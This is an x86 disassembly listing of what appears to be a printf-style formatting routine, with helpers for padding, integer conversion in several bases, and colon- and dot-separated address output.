00000829  E812040000        call 0xc40
0000082E  8B4C2418          mov ecx,[esp+0x18]
00000832  8B7C242C          mov edi,[esp+0x2c]
00000836  83C404            add esp,byte +0x4
00000839  89442410          mov [esp+0x10],eax
0000083D  EB1D              jmp short 0x85c
0000083F  3C2A              cmp al,0x2a
00000841  751D              jnz 0x860
00000843  8B44242C          mov eax,[esp+0x2c]
00000847  47                inc edi
00000848  83C304            add ebx,byte +0x4
0000084B  83C004            add eax,byte +0x4
0000084E  8944242C          mov [esp+0x2c],eax
00000852  897C2428          mov [esp+0x28],edi
00000856  8B03              mov eax,[ebx]
00000858  89442410          mov [esp+0x10],eax
0000085C  85C0              test eax,eax
0000085E  7D08              jnl 0x868
00000860  C744241000000000  mov dword [esp+0x10],0x0
00000868  8A07              mov al,[edi]
0000086A  C7442418FFFFFFFF  mov dword [esp+0x18],0xffffffff
00000872  3C68              cmp al,0x68
00000874  7408              jz 0x87e
00000876  3C6C              cmp al,0x6c
00000878  7404              jz 0x87e
0000087A  3C4C              cmp al,0x4c
0000087C  750C              jnz 0x88a
0000087E  0FBED0            movsx edx,al
00000881  47                inc edi
00000882  89542418          mov [esp+0x18],edx
00000886  897C2428          mov [esp+0x28],edi
0000088A  8A07              mov al,[edi]
0000088C  C744241C0A000000  mov dword [esp+0x1c],0xa
00000894  0FBED0            movsx edx,al
00000897  8D7ABF            lea edi,[edx-0x41]
0000089A  83FF37            cmp edi,byte +0x37
0000089D  0F878A020000      ja near 0xb2d
000008A3  33D2              xor edx,edx
000008A5  8A97D40B1E00      mov dl,[edi+0x1e0bd4]
000008AB  FF2495A00B1E00    jmp near [edx*4+0x1e0ba0]
000008B2  F6C110            test cl,0x10
000008B5  7520              jnz 0x8d7
000008B7  4E                dec esi
000008B8  85F6              test esi,esi
000008BA  7E1B              jng 0x8d7
000008BC  8BCE              mov ecx,esi
000008BE  B820202020        mov eax,0x20202020
000008C3  8BD1              mov edx,ecx
000008C5  8BFD              mov edi,ebp
000008C7  C1E902            shr ecx,0x2
000008CA  F3AB              rep stosd
000008CC  8BCA              mov ecx,edx
000008CE  03EE              add ebp,esi
000008D0  83E103            and ecx,byte +0x3
000008D3  33F6              xor esi,esi
000008D5  F3AA              rep stosb
000008D7  8B7C242C          mov edi,[esp+0x2c]
000008DB  8A4304            mov al,[ebx+0x4]
000008DE  83C304            add ebx,byte +0x4
000008E1  83C704            add edi,byte +0x4
000008E4  884500            mov [ebp+0x0],al
000008E7  45                inc ebp
000008E8  4E                dec esi
000008E9  897C242C          mov [esp+0x2c],edi
000008ED  85F6              test esi,esi
000008EF  0F8E55020000      jng near 0xb4a
000008F5  E995000000        jmp 0x98f
000008FA  8B4C242C          mov ecx,[esp+0x2c]
000008FE  8B7B04            mov edi,[ebx+0x4]
00000901  83C304            add ebx,byte +0x4
00000904  83C104            add ecx,byte +0x4
00000907  85FF              test edi,edi
00000909  894C242C          mov [esp+0x2c],ecx
0000090D  897C2418          mov [esp+0x18],edi
00000911  750C              jnz 0x91f
00000913  C744241808601E00  mov dword [esp+0x18],0x1e6008
0000091B  8B7C2418          mov edi,[esp+0x18]
0000091F  8B442410          mov eax,[esp+0x10]
00000923  50                push eax
00000924  57                push edi
00000925  E8E6020000        call 0xc10
0000092A  8A4C241C          mov cl,[esp+0x1c]
0000092E  83C408            add esp,byte +0x8
00000931  F6C110            test cl,0x10
00000934  89442410          mov [esp+0x10],eax
00000938  7537              jnz 0x971
0000093A  8BCE              mov ecx,esi
0000093C  4E                dec esi
0000093D  3BC1              cmp eax,ecx
0000093F  7D30              jnl 0x971
00000941  8BCE              mov ecx,esi
00000943  8BFD              mov edi,ebp
00000945  2BC8              sub ecx,eax
00000947  B820202020        mov eax,0x20202020
0000094C  41                inc ecx
0000094D  894C241C          mov [esp+0x1c],ecx
00000951  8BD1              mov edx,ecx
00000953  C1E902            shr ecx,0x2
00000956  F3AB              rep stosd
00000958  8BCA              mov ecx,edx
0000095A  83E103            and ecx,byte +0x3
0000095D  F3AA              rep stosb
0000095F  8BC2              mov eax,edx
00000961  03E8              add ebp,eax
00000963  48                dec eax
00000964  4E                dec esi
00000965  85C0              test eax,eax
00000967  77FA              ja 0x963
00000969  8B7C2418          mov edi,[esp+0x18]
0000096D  8B442410          mov eax,[esp+0x10]
00000971  85C0              test eax,eax
00000973  7E0C              jng 0x981
00000975  8BC8              mov ecx,eax
00000977  8A17              mov dl,[edi]
00000979  885500            mov [ebp+0x0],dl
0000097C  45                inc ebp
0000097D  47                inc edi
0000097E  49                dec ecx
0000097F  75F6              jnz 0x977
00000981  8BCE              mov ecx,esi
00000983  4E                dec esi
00000984  3BC1              cmp eax,ecx
00000986  0F8DBE010000      jnl near 0xb4a
0000098C  2BF0              sub esi,eax
0000098E  46                inc esi
0000098F  8BCE              mov ecx,esi
00000991  B820202020        mov eax,0x20202020
00000996  8BD1              mov edx,ecx
00000998  8BFD              mov edi,ebp
0000099A  C1E902            shr ecx,0x2
0000099D  F3AB              rep stosd
0000099F  8BCA              mov ecx,edx
000009A1  83E103            and ecx,byte +0x3
000009A4  03EE              add ebp,esi
000009A6  F3AA              rep stosb
000009A8  E99D010000        jmp 0xb4a
000009AD  83FEFF            cmp esi,byte -0x1
000009B0  7508              jnz 0x9ba
000009B2  BE08000000        mov esi,0x8
000009B7  83C901            or ecx,byte +0x1
000009BA  8B442410          mov eax,[esp+0x10]
000009BE  8B7C242C          mov edi,[esp+0x2c]
000009C2  83C304            add ebx,byte +0x4
000009C5  51                push ecx
000009C6  50                push eax
000009C7  56                push esi
000009C8  8B0B              mov ecx,[ebx]
000009CA  6A10              push byte +0x10
000009CC  83C704            add edi,byte +0x4
000009CF  51                push ecx
000009D0  55                push ebp
000009D1  897C2444          mov [esp+0x44],edi
000009D5  E896020000        call 0xc70
000009DA  83C418            add esp,byte +0x18
000009DD  8BE8              mov ebp,eax
000009DF  E966010000        jmp 0xb4a
000009E4  837C24186C        cmp dword [esp+0x18],byte +0x6c
000009E9  751F              jnz 0xa0a
000009EB  8B4C242C          mov ecx,[esp+0x2c]
000009EF  8B442424          mov eax,[esp+0x24]
000009F3  83C304            add ebx,byte +0x4
000009F6  8BD5              mov edx,ebp
000009F8  83C104            add ecx,byte +0x4
000009FB  2BD0              sub edx,eax
000009FD  8B03              mov eax,[ebx]
000009FF  894C242C          mov [esp+0x2c],ecx
00000A03  8910              mov [eax],edx
00000A05  E940010000        jmp 0xb4a
00000A0A  8B4C242C          mov ecx,[esp+0x2c]
00000A0E  8B442424          mov eax,[esp+0x24]
00000A12  8B5304            mov edx,[ebx+0x4]
00000A15  83C104            add ecx,byte +0x4
00000A18  83C304            add ebx,byte +0x4
00000A1B  894C242C          mov [esp+0x2c],ecx
00000A1F  8BCD              mov ecx,ebp
00000A21  2BC8              sub ecx,eax
00000A23  890A              mov [edx],ecx
00000A25  E920010000        jmp 0xb4a
00000A2A  83C940            or ecx,byte +0x40
00000A2D  837C24186C        cmp dword [esp+0x18],byte +0x6c
00000A32  7528              jnz 0xa5c
00000A34  8B442410          mov eax,[esp+0x10]
00000A38  8B7C242C          mov edi,[esp+0x2c]
00000A3C  83C304            add ebx,byte +0x4
00000A3F  51                push ecx
00000A40  50                push eax
00000A41  56                push esi
00000A42  8B0B              mov ecx,[ebx]
00000A44  83C704            add edi,byte +0x4
00000A47  51                push ecx
00000A48  55                push ebp
00000A49  897C2440          mov [esp+0x40],edi
00000A4D  E86E040000        call 0xec0
00000A52  83C414            add esp,byte +0x14
00000A55  8BE8              mov ebp,eax
00000A57  E9EE000000        jmp 0xb4a
00000A5C  8B542410          mov edx,[esp+0x10]
00000A60  8B7C242C          mov edi,[esp+0x2c]
00000A64  8B4304            mov eax,[ebx+0x4]
00000A67  83C304            add ebx,byte +0x4
00000A6A  51                push ecx
00000A6B  52                push edx
00000A6C  56                push esi
00000A6D  83C704            add edi,byte +0x4
00000A70  50                push eax
00000A71  55                push ebp
00000A72  897C2440          mov [esp+0x40],edi
00000A76  E825050000        call 0xfa0
00000A7B  83C414            add esp,byte +0x14
00000A7E  8BE8              mov ebp,eax
00000A80  E9C5000000        jmp 0xb4a
00000A85  BF08000000        mov edi,0x8
00000A8A  EB11              jmp short 0xa9d
00000A8C  83C940            or ecx,byte +0x40
00000A8F  BF10000000        mov edi,0x10
00000A94  EB07              jmp short 0xa9d
00000A96  83C902            or ecx,byte +0x2
00000A99  8B7C241C          mov edi,[esp+0x1c]
00000A9D  8B442418          mov eax,[esp+0x18]
00000AA1  83F86C            cmp eax,byte +0x6c
00000AA4  7432              jz 0xad8
00000AA6  83F868            cmp eax,byte +0x68
00000AA9  752D              jnz 0xad8
00000AAB  F6C102            test cl,0x2
00000AAE  7413              jz 0xac3
00000AB0  8B44242C          mov eax,[esp+0x2c]
00000AB4  83C304            add ebx,byte +0x4
00000AB7  83C004            add eax,byte +0x4
00000ABA  0FBF13            movsx edx,word [ebx]
00000ABD  8944242C          mov [esp+0x2c],eax
00000AC1  EB26              jmp short 0xae9
00000AC3  8B44242C          mov eax,[esp+0x2c]
00000AC7  83C304            add ebx,byte +0x4
00000ACA  83C004            add eax,byte +0x4
00000ACD  33D2              xor edx,edx
00000ACF  668B13            mov dx,[ebx]
00000AD2  8944242C          mov [esp+0x2c],eax
00000AD6  EB11              jmp short 0xae9
00000AD8  8B44242C          mov eax,[esp+0x2c]
00000ADC  8B5304            mov edx,[ebx+0x4]
00000ADF  83C304            add ebx,byte +0x4
00000AE2  83C004            add eax,byte +0x4
00000AE5  8944242C          mov [esp+0x2c],eax
00000AE9  51                push ecx
00000AEA  8B4C2414          mov ecx,[esp+0x14]
00000AEE  51                push ecx
00000AEF  56                push esi
00000AF0  57                push edi
00000AF1  52                push edx
00000AF2  55                push ebp
00000AF3  E878010000        call 0xc70
00000AF8  83C418            add esp,byte +0x18
00000AFB  8BE8              mov ebp,eax
00000AFD  EB4B              jmp short 0xb4a
00000AFF  8B54242C          mov edx,[esp+0x2c]
00000B03  83C902            or ecx,byte +0x2
00000B06  51                push ecx
00000B07  50                push eax
00000B08  8B442418          mov eax,[esp+0x18]
00000B0C  83C208            add edx,byte +0x8
00000B0F  50                push eax
00000B10  56                push esi
00000B11  DD02              fld qword [edx]
00000B13  83EC08            sub esp,byte +0x8
00000B16  83C308            add ebx,byte +0x8
00000B19  DD1C24            fstp qword [esp]
00000B1C  55                push ebp
00000B1D  89542448          mov [esp+0x48],edx
00000B21  E8BA050000        call 0x10e0
00000B26  83C41C            add esp,byte +0x1c
00000B29  8BE8              mov ebp,eax
00000B2B  EB1D              jmp short 0xb4a
00000B2D  3C25              cmp al,0x25
00000B2F  7405              jz 0xb36
00000B31  C6450025          mov byte [ebp+0x0],0x25
00000B35  45                inc ebp
00000B36  8B4C2428          mov ecx,[esp+0x28]
00000B3A  8A01              mov al,[ecx]
00000B3C  84C0              test al,al
00000B3E  7406              jz 0xb46
00000B40  884500            mov [ebp+0x0],al
00000B43  45                inc ebp
00000B44  EB04              jmp short 0xb4a
00000B46  FF4C2428          dec dword [esp+0x28]
00000B4A  8B442428          mov eax,[esp+0x28]
00000B4E  40                inc eax
00000B4F  89442428          mov [esp+0x28],eax
00000B53  8A00              mov al,[eax]
00000B55  84C0              test al,al
00000B57  0F85FCFBFFFF      jnz near 0x759
00000B5D  5E                pop esi
00000B5E  5B                pop ebx
00000B5F  8B4C241C          mov ecx,[esp+0x1c]
00000B63  8BC5              mov eax,ebp
00000B65  C6450000          mov byte [ebp+0x0],0x0
00000B69  5F                pop edi
00000B6A  2BC1              sub eax,ecx
00000B6C  5D                pop ebp
00000B6D  83C410            add esp,byte +0x10
00000B70  C3                ret
00000B71  8D4900            lea ecx,[ecx+0x0]
00000B74  99                cdq
00000B75  07                pop es
00000B76  1E                push ds
00000B77  009E071E0094      add [esi+0x94001e07],bl
00000B7D  07                pop es
00000B7E  1E                push ds
00000B7F  008F071E00A3      add [edi+0xa3001e07],cl
00000B85  07                pop es
00000B86  1E                push ds
00000B87  00B6071E0000      add [esi+0x1e07],dh
00000B8D  0505010505        add eax,0x5050105
00000B92  0505050505        add eax,0x5050505
00000B97  020503050504      add al,[0x4050503]
00000B9D  8D4900            lea ecx,[ecx+0x0]
00000BA0  2A0A              sub cl,[edx]
00000BA2  1E                push ds
00000BA3  00FF              add bh,bh
00000BA5  0A1E              or bl,[esi]
00000BA7  008C0A1E002D0A    add [edx+ecx+0xa2d001e],cl
00000BAE  1E                push ds
00000BAF  00B2081E0096      add [edx+0x96001e08],dh
00000BB5  0A1E              or bl,[esi]
00000BB7  00E4              add ah,ah
00000BB9  091E              or [esi],ebx
00000BBB  00850A1E00AD      add [ebp+0xad001e0a],al
00000BC1  091E              or [esi],ebx
00000BC3  00FA              add dl,bh
00000BC5  081E              or [esi],bl
00000BC7  00990A1E008F      add [ecx+0x8f001e0a],bl
00000BCD  0A1E              or bl,[esi]
00000BCF  002D0B1E0000      add [0x1e0b],ch
00000BD5  0C0C              or al,0xc
00000BD7  0C01              or al,0x1
00000BD9  0C01              or al,0x1
00000BDB  0C0C              or al,0xc
00000BDD  0C0C              or al,0xc
00000BDF  0C0C              or al,0xc
00000BE1  0C0C              or al,0xc
00000BE3  0C0C              or al,0xc
00000BE5  0C0C              or al,0xc
00000BE7  0C0C              or al,0xc
00000BE9  0C0C              or al,0xc
00000BEB  020C0C            add cl,[esp+ecx]
00000BEE  0C0C              or al,0xc
00000BF0  0C0C              or al,0xc
00000BF2  0C0C              or al,0xc
00000BF4  030C04            add ecx,[esp+eax]
00000BF7  050101010C        add eax,0xc010101
00000BFC  050C0C0C0C        add eax,0xc0c0c0c
00000C01  06                push es
00000C02  07                pop es
00000C03  080C0C            or [esp+ecx],cl
00000C06  090C0A            or [edx+ecx],ecx
00000C09  0C0C              or al,0xc
00000C0B  0B909090908B      or edx,[eax+0x8b909090]
00000C11  4C                dec esp
00000C12  2404              and al,0x4
00000C14  53                push ebx
00000C15  56                push esi
00000C16  8BC1              mov eax,ecx
00000C18  803900            cmp byte [ecx],0x0
00000C1B  7413              jz 0xc30
00000C1D  8B542410          mov edx,[esp+0x10]
00000C21  8BF2              mov esi,edx
00000C23  4A                dec edx
00000C24  85F6              test esi,esi
00000C26  7408              jz 0xc30
00000C28  8A5801            mov bl,[eax+0x1]
00000C2B  40                inc eax
00000C2C  84DB              test bl,bl
00000C2E  75F1              jnz 0xc21
00000C30  5E                pop esi
00000C31  2BC1              sub eax,ecx
00000C33  5B                pop ebx
00000C34  C3                ret
00000C35  90                nop
00000C36  90                nop
00000C37  90                nop
00000C38  90                nop
00000C39  90                nop
00000C3A  90                nop
00000C3B  90                nop
00000C3C  90                nop
00000C3D  90                nop
00000C3E  90                nop
00000C3F  90                nop
00000C40  56                push esi
00000C41  8B742408          mov esi,[esp+0x8]
00000C45  33C0              xor eax,eax
00000C47  8B0E              mov ecx,[esi]
00000C49  803930            cmp byte [ecx],0x30
00000C4C  7C1D              jl 0xc6b
00000C4E  8B0E              mov ecx,[esi]
00000C50  8A11              mov dl,[ecx]
00000C52  80FA39            cmp dl,0x39
00000C55  7F14              jg 0xc6b
00000C57  0FBED2            movsx edx,dl
00000C5A  8D0480            lea eax,[eax+eax*4]
00000C5D  41                inc ecx
00000C5E  890E              mov [esi],ecx
00000C60  8D4442D0          lea eax,[edx+eax*2-0x30]
00000C64  8A11              mov dl,[ecx]
00000C66  80FA30            cmp dl,0x30
00000C69  7DE3              jnl 0xc4e
00000C6B  5E                pop esi
00000C6C  C3                ret
00000C6D  90                nop
00000C6E  90                nop
00000C6F  90                nop
00000C70  8B542418          mov edx,[esp+0x18]
00000C74  83EC48            sub esp,byte +0x48
00000C77  F6C240            test dl,0x40
00000C7A  55                push ebp
00000C7B  56                push esi
00000C7C  8B35B05F1E00      mov esi,[0x1e5fb0]
00000C82  7406              jz 0xc8a
00000C84  8B35B45F1E00      mov esi,[0x1e5fb4]
00000C8A  F6C210            test dl,0x10
00000C8D  7407              jz 0xc96
00000C8F  83E2FE            and edx,byte -0x2
00000C92  89542468          mov [esp+0x68],edx
00000C96  8B6C245C          mov ebp,[esp+0x5c]
00000C9A  83FD02            cmp ebp,byte +0x2
00000C9D  0F8C07020000      jl near 0xeaa
00000CA3  83FD24            cmp ebp,byte +0x24
00000CA6  0F8FFE010000      jg near 0xeaa
00000CAC  53                push ebx
00000CAD  8ADA              mov bl,dl
00000CAF  80E301            and bl,0x1
00000CB2  57                push edi
00000CB3  80CB02            or bl,0x2
00000CB6  C644241200        mov byte [esp+0x12],0x0
00000CBB  C0E304            shl bl,0x4
00000CBE  F6C202            test dl,0x2
00000CC1  885C2413          mov [esp+0x13],bl
00000CC5  743E              jz 0xd05
00000CC7  8B4C2460          mov ecx,[esp+0x60]
00000CCB  85C9              test ecx,ecx
00000CCD  7D0E              jnl 0xcdd
00000CCF  8B7C2468          mov edi,[esp+0x68]
00000CD3  C64424122D        mov byte [esp+0x12],0x2d
00000CD8  F7D9              neg ecx
00000CDA  4F                dec edi
00000CDB  EB30              jmp short 0xd0d
00000CDD  F6C204            test dl,0x4
00000CE0  740C              jz 0xcee
00000CE2  8B7C2468          mov edi,[esp+0x68]
00000CE6  C64424122B        mov byte [esp+0x12],0x2b
00000CEB  4F                dec edi
00000CEC  EB1F              jmp short 0xd0d
00000CEE  F6C208            test dl,0x8
00000CF1  740C              jz 0xcff
00000CF3  8B7C2468          mov edi,[esp+0x68]
00000CF7  C644241220        mov byte [esp+0x12],0x20
00000CFC  4F                dec edi
00000CFD  EB0E              jmp short 0xd0d
00000CFF  8B7C2468          mov edi,[esp+0x68]
00000D03  EB08              jmp short 0xd0d
00000D05  8B7C2468          mov edi,[esp+0x68]
00000D09  8B4C2460          mov ecx,[esp+0x60]
00000D0D  8BC2              mov eax,edx
00000D0F  83E020            and eax,byte +0x20
00000D12  89442460          mov [esp+0x60],eax
00000D16  7410              jz 0xd28
00000D18  83FD10            cmp ebp,byte +0x10
00000D1B  7505              jnz 0xd22
00000D1D  83EF02            sub edi,byte +0x2
00000D20  EB06              jmp short 0xd28
00000D22  83FD08            cmp ebp,byte +0x8
00000D25  7501              jnz 0xd28
00000D27  4F                dec edi
00000D28  33ED              xor ebp,ebp
00000D2A  85C9              test ecx,ecx
00000D2C  750C              jnz 0xd3a
00000D2E  C644241430        mov byte [esp+0x14],0x30
00000D33  BD01000000        mov ebp,0x1
00000D38  EB22              jmp short 0xd5c
00000D3A  8BC1              mov eax,ecx
00000D3C  33D2              xor edx,edx
00000D3E  F7742464          div dword [esp+0x64]
00000D42  45                inc ebp
00000D43  8A0432            mov al,[edx+esi]
00000D46  33D2              xor edx,edx
00000D48  88442C13          mov [esp+ebp+0x13],al
00000D4C  8BC1              mov eax,ecx
00000D4E  F7742464          div dword [esp+0x64]
00000D52  8BC8              mov ecx,eax
00000D54  85C9              test ecx,ecx
00000D56  75E2              jnz 0xd3a
00000D58  8B542470          mov edx,[esp+0x70]
00000D5C  8B44246C          mov eax,[esp+0x6c]
00000D60  3BE8              cmp ebp,eax
00000D62  7E06              jng 0xd6a
00000D64  8BC5              mov eax,ebp
00000D66  8944246C          mov [esp+0x6c],eax
00000D6A  2BF8              sub edi,eax
00000D6C  F6C211            test dl,0x11
00000D6F  897C2468          mov [esp+0x68],edi
00000D73  7566              jnz 0xddb
00000D75  8BCF              mov ecx,edi
00000D77  4F                dec edi
00000D78  85C9              test ecx,ecx
00000D7A  897C2468          mov [esp+0x68],edi
00000D7E  7E5B              jng 0xddb
00000D80  8B74245C          mov esi,[esp+0x5c]
00000D84  8D5701            lea edx,[edi+0x1]
00000D87  8BCA              mov ecx,edx
00000D89  B820202020        mov eax,0x20202020
00000D8E  8BD9              mov ebx,ecx
00000D90  8BFE              mov edi,esi
00000D92  C1E902            shr ecx,0x2
00000D95  F3AB              rep stosd
00000D97  8BCB              mov ecx,ebx
00000D99  83E103            and ecx,byte +0x3
00000D9C  03F2              add esi,edx
00000D9E  F3AA              rep stosb
00000DA0  8B7C2468          mov edi,[esp+0x68]
00000DA4  4A                dec edx
00000DA5  4F                dec edi
00000DA6  85D2              test edx,edx
00000DA8  77FA              ja 0xda4
00000DAA  8A5C2413          mov bl,[esp+0x13]
00000DAE  8B44246C          mov eax,[esp+0x6c]
00000DB2  8B542470          mov edx,[esp+0x70]
00000DB6  897C2468          mov [esp+0x68],edi
00000DBA  8A4C2412          mov cl,[esp+0x12]
00000DBE  84C9              test cl,cl
00000DC0  7403              jz 0xdc5
00000DC2  880E              mov [esi],cl
00000DC4  46                inc esi
00000DC5  8B4C2460          mov ecx,[esp+0x60]
00000DC9  85C9              test ecx,ecx
00000DCB  7429              jz 0xdf6
00000DCD  8B4C2464          mov ecx,[esp+0x64]
00000DD1  83F908            cmp ecx,byte +0x8
00000DD4  750B              jnz 0xde1
00000DD6  C60630            mov byte [esi],0x30
00000DD9  EB1A              jmp short 0xdf5
00000DDB  8B74245C          mov esi,[esp+0x5c]
00000DDF  EBD9              jmp short 0xdba
00000DE1  83F910            cmp ecx,byte +0x10
00000DE4  7510              jnz 0xdf6
00000DE6  C60630            mov byte [esi],0x30
00000DE9  8B0DB05F1E00      mov ecx,[0x1e5fb0]
00000DEF  46                inc esi
00000DF0  8A4921            mov cl,[ecx+0x21]
00000DF3  880E              mov [esi],cl
00000DF5  46                inc esi
00000DF6  F6C210            test dl,0x10
00000DF9  7544              jnz 0xe3f
00000DFB  8BD7              mov edx,edi
00000DFD  4F                dec edi
00000DFE  85D2              test edx,edx
00000E00  897C2468          mov [esp+0x68],edi
00000E04  7E39              jng 0xe3f
00000E06  8AC3              mov al,bl
00000E08  8AFB              mov bh,bl
00000E0A  8D4F01            lea ecx,[edi+0x1]
00000E0D  8BC3              mov eax,ebx
00000E0F  894C2470          mov [esp+0x70],ecx
00000E13  8BD1              mov edx,ecx
00000E15  C1E010            shl eax,0x10
00000E18  8BFE              mov edi,esi
00000E1A  668BC3            mov ax,bx
00000E1D  C1E902            shr ecx,0x2
00000E20  F3AB              rep stosd
00000E22  8BCA              mov ecx,edx
00000E24  83E103            and ecx,byte +0x3
00000E27  F3AA              rep stosb
00000E29  8B7C2468          mov edi,[esp+0x68]
00000E2D  8BC2              mov eax,edx
00000E2F  03F0              add esi,eax
00000E31  48                dec eax
00000E32  4F                dec edi
00000E33  85C0              test eax,eax
00000E35  77FA              ja 0xe31
00000E37  8B44246C          mov eax,[esp+0x6c]
00000E3B  897C2468          mov [esp+0x68],edi
00000E3F  8BC8              mov ecx,eax
00000E41  48                dec eax
00000E42  3BE9              cmp ebp,ecx
00000E44  7D22              jnl 0xe68
00000E46  2BC5              sub eax,ebp
00000E48  8BFE              mov edi,esi
00000E4A  40                inc eax
00000E4B  8BD0              mov edx,eax
00000E4D  B830303030        mov eax,0x30303030
00000E52  8BCA              mov ecx,edx
00000E54  8BD9              mov ebx,ecx
00000E56  C1E902            shr ecx,0x2
00000E59  F3AB              rep stosd
00000E5B  8BCB              mov ecx,ebx
00000E5D  83E103            and ecx,byte +0x3
00000E60  03F2              add esi,edx
00000E62  F3AA              rep stosb
00000E64  8B7C2468          mov edi,[esp+0x68]
00000E68  8BD5              mov edx,ebp
00000E6A  4D                dec ebp
00000E6B  85D2              test edx,edx
00000E6D  7E0E              jng 0xe7d
00000E6F  8A442C14          mov al,[esp+ebp+0x14]
00000E73  8BCD              mov ecx,ebp
00000E75  8806              mov [esi],al
00000E77  46                inc esi
00000E78  4D                dec ebp
00000E79  85C9              test ecx,ecx
00000E7B  7FF2              jg 0xe6f
00000E7D  8BD7              mov edx,edi
00000E7F  4F                dec edi
00000E80  85D2              test edx,edx
00000E82  7E1C              jng 0xea0
00000E84  8D5701            lea edx,[edi+0x1]
00000E87  B820202020        mov eax,0x20202020
00000E8C  8BCA              mov ecx,edx
00000E8E  8BFE              mov edi,esi
00000E90  8BD9              mov ebx,ecx
00000E92  C1E902            shr ecx,0x2
00000E95  F3AB              rep stosd
00000E97  8BCB              mov ecx,ebx
00000E99  83E103            and ecx,byte +0x3
00000E9C  03F2              add esi,edx
00000E9E  F3AA              rep stosb
00000EA0  5F                pop edi
00000EA1  8BC6              mov eax,esi
00000EA3  5B                pop ebx
00000EA4  5E                pop esi
00000EA5  5D                pop ebp
00000EA6  83C448            add esp,byte +0x48
00000EA9  C3                ret
00000EAA  5E                pop esi
00000EAB  33C0              xor eax,eax
00000EAD  5D                pop ebp
00000EAE  83C448            add esp,byte +0x48
00000EB1  C3                ret
00000EB2  90                nop
00000EB3  90                nop
00000EB4  90                nop
00000EB5  90                nop
00000EB6  90                nop
00000EB7  90                nop
00000EB8  90                nop
00000EB9  90                nop
00000EBA  90                nop
00000EBB  90                nop
00000EBC  90                nop
00000EBD  90                nop
00000EBE  90                nop
00000EBF  90                nop
00000EC0  8A442414          mov al,[esp+0x14]
00000EC4  83EC18            sub esp,byte +0x18
00000EC7  A840              test al,0x40
00000EC9  53                push ebx
00000ECA  55                push ebp
00000ECB  56                push esi
00000ECC  57                push edi
00000ECD  8B3DB05F1E00      mov edi,[0x1e5fb0]
00000ED3  7406              jz 0xedb
00000ED5  8B3DB45F1E00      mov edi,[0x1e5fb4]
00000EDB  8B6C2430          mov ebp,[esp+0x30]
00000EDF  33D2              xor edx,edx
00000EE1  33F6              xor esi,esi
00000EE3  B13A              mov cl,0x3a
00000EE5  85F6              test esi,esi
00000EE7  7405              jz 0xeee
00000EE9  884C1410          mov [esp+edx+0x10],cl
00000EED  42                inc edx
00000EEE  33C0              xor eax,eax
00000EF0  8A042E            mov al,[esi+ebp]
00000EF3  8BD8              mov ebx,eax
00000EF5  83E00F            and eax,byte +0xf
00000EF8  C1EB04            shr ebx,0x4
00000EFB  8A0438            mov al,[eax+edi]
00000EFE  42                inc edx
00000EFF  8A1C3B            mov bl,[ebx+edi]
00000F02  885C140F          mov [esp+edx+0xf],bl
00000F06  88441410          mov [esp+edx+0x10],al
00000F0A  42                inc edx
00000F0B  46                inc esi
00000F0C  83FE06            cmp esi,byte +0x6
00000F0F  7CD4              jl 0xee5
00000F11  8A44243C          mov al,[esp+0x3c]
00000F15  8B5C2434          mov ebx,[esp+0x34]
00000F19  A810              test al,0x10
00000F1B  7533              jnz 0xf50
00000F1D  8BCB              mov ecx,ebx
00000F1F  4B                dec ebx
00000F20  3BD1              cmp edx,ecx
00000F22  7D2C              jnl 0xf50
00000F24  8BF3              mov esi,ebx
00000F26  8B7C242C          mov edi,[esp+0x2c]
00000F2A  2BF2              sub esi,edx
00000F2C  B820202020        mov eax,0x20202020
00000F31  46                inc esi
00000F32  8BCE              mov ecx,esi
00000F34  8BE9              mov ebp,ecx
00000F36  C1E902            shr ecx,0x2
00000F39  F3AB              rep stosd
00000F3B  8BCD              mov ecx,ebp
00000F3D  8B6C242C          mov ebp,[esp+0x2c]
00000F41  83E103            and ecx,byte +0x3
00000F44  03EE              add ebp,esi
00000F46  F3AA              rep stosb
00000F48  4E                dec esi
00000F49  4B                dec ebx
00000F4A  85F6              test esi,esi
00000F4C  77FA              ja 0xf48
00000F4E  EB04              jmp short 0xf54
00000F50  8B6C242C          mov ebp,[esp+0x2c]
00000F54  85D2              test edx,edx
00000F56  7E18              jng 0xf70
00000F58  8BCA              mov ecx,edx
00000F5A  8D742410          lea esi,[esp+0x10]
00000F5E  8BC1              mov eax,ecx
00000F60  8BFD              mov edi,ebp
00000F62  C1E902            shr ecx,0x2
00000F65  F3A5              rep movsd
00000F67  8BC8              mov ecx,eax
00000F69  83E103            and ecx,byte +0x3
00000F6C  03EA              add ebp,edx
00000F6E  F3A4              rep movsb
00000F70  8BCB              mov ecx,ebx
00000F72  4B                dec ebx
00000F73  3BD1              cmp edx,ecx
00000F75  7D1C              jnl 0xf93
00000F77  2BDA              sub ebx,edx
00000F79  B820202020        mov eax,0x20202020
00000F7E  43                inc ebx
00000F7F  8BFD              mov edi,ebp
00000F81  8BCB              mov ecx,ebx
00000F83  8BD1              mov edx,ecx
00000F85  C1E902            shr ecx,0x2
00000F88  F3AB              rep stosd
00000F8A  8BCA              mov ecx,edx
00000F8C  83E103            and ecx,byte +0x3
00000F8F  03EB              add ebp,ebx
00000F91  F3AA              rep stosb
00000F93  5F                pop edi
00000F94  8BC5              mov eax,ebp
00000F96  5E                pop esi
00000F97  5D                pop ebp
00000F98  5B                pop ebx
00000F99  83C418            add esp,byte +0x18
00000F9C  C3                ret
00000F9D  90                nop
00000F9E  90                nop
00000F9F  90                nop
00000FA0  8B4C2408          mov ecx,[esp+0x8]
00000FA4  83EC18            sub esp,byte +0x18
00000FA7  53                push ebx
00000FA8  55                push ebp
00000FA9  56                push esi
00000FAA  57                push edi
00000FAB  8B3DB05F1E00      mov edi,[0x1e5fb0]
00000FB1  33DB              xor ebx,ebx
00000FB3  33ED              xor ebp,ebp
00000FB5  85ED              test ebp,ebp
00000FB7  7406              jz 0xfbf
00000FB9  C6441C102E        mov byte [esp+ebx+0x10],0x2e
00000FBE  43                inc ebx
00000FBF  33C0              xor eax,eax
00000FC1  8A0429            mov al,[ecx+ebp]
00000FC4  8BF0              mov esi,eax
00000FC6  85F6              test esi,esi
00000FC8  7508              jnz 0xfd2
00000FCA  8A17              mov dl,[edi]
00000FCC  88541C10          mov [esp+ebx+0x10],dl
00000FD0  EB5D              jmp short 0x102f
00000FD2  83FE64            cmp esi,byte +0x64
00000FD5  7C27              jl 0xffe
00000FD7  B81F85EB51        mov eax,0x51eb851f
00000FDC  F7EE              imul esi
00000FDE  C1FA05            sar edx,0x5
00000FE1  8BC2              mov eax,edx
00000FE3  C1E81F            shr eax,0x1f
00000FE6  03D0              add edx,eax
00000FE8  8BC6              mov eax,esi
00000FEA  BE64000000        mov esi,0x64
00000FEF  43                inc ebx
